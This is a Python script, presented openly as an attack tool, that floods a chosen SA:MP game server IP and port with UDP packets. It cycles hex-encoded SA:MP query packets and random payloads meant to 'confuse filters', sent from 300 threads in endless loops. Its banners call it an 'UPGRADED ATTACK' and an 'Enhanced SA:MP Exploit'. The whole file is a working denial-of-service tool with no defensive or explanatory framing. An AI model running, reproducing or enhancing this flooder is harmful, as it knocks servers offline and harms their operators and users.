import socket
import struct
import codecs
import sys
import threading
import random
import time
import os


ip = sys.argv[1]
port = int(sys.argv[2])
orgip = ip

# Additional payloads and randomized lengths for enhanced attack
Pacotes = [
    codecs.decode("53414d5090d91d4d611e700a465b00", "hex_codec"),
    codecs.decode("53414d509538e1a9611e63", "hex_codec"),
    codecs.decode("53414d509538e1a9611e69", "hex_codec"),
    codecs.decode("53414d509538e1a9611e72", "hex_codec"),
    codecs.decode("081e62da", "hex_codec"),
    codecs.decode("081e77da", "hex_codec"),
    codecs.decode("081e4dda", "hex_codec"),
    codecs.decode("021efd40", "hex_codec"),
    codecs.decode("021efd40", "hex_codec"),
    codecs.decode("081e7eda", "hex_codec"),
    codecs.decode("53414d5090d91d4d611e700a465b11", "hex_codec"),
    codecs.decode("53414d509538e1a9611e90", "hex_codec"),
    os.urandom(1024),  # Random payload to confuse filters
    os.urandom(2048)   # Larger random payload
]

print(f"UPGRADED ATTACK ON IP: {orgip} AND PORT: {port} INITIATED")

class MyThread(threading.Thread):
    def run(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Internet and UDP
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        while True:
            msg = random.choice(Pacotes)
            sock.sendto(msg, (ip, port))
            
            # Send additional payloads on critical ports
            if port in [7777, 7796, 7771, 7784, 1111]:
                sock.sendto(random.choice(Pacotes), (ip, port))

if __name__ == '__main__':
    try:
        threads = []
        for _ in range(300):  # Increased thread count to 300 for massive load
            mythread = MyThread()
            mythread.start()
            threads.append(mythread)
            time.sleep(0.03)  # Reduced delay for higher packet rate
        
        for t in threads:
            t.join()

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print('#########################################################################')
        print('Enhanced SA:MP Exploit Terminated')
        print('#########################################################################')
        print(f'\n\nAttack on IP {orgip} has been stopped.')
        pass